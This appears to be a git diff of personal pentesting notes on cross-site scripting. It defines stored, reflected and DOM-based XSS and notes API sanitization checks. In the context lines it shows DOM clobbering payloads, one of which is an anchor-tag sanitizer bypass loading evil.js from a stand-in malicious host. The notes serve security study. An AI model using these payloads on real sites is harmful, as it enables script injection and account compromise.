@@ -1,4 +1,15 @@
 
+## types
+### Stored (Persistent) 
+XSS 	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
+
+## Reflected (Non-Persistent) XSS 	
+Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)
+
+
+## DOM-based XSS 	Another Non-Persistent 
+XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)
+
 
 ## Tags bruteforcing
 - [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
@@ -41,4 +52,12 @@ DOM Clobbering use the HTMLCollection vulnerability which allow you to add to th
 2. check in the javascript if there is a ```window.element || something here``` 
 3. bypass the sanitization with double anchortag ```<a id=defaultAvatar><<a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//)"'>
   - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```
+
+
+## Other Resources:
+#### xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
+- filtering and sanitazation come frontend back end.
+- Always test that frontend and backend are sanitized.
+- eg: registering an account by API with email.
+
  
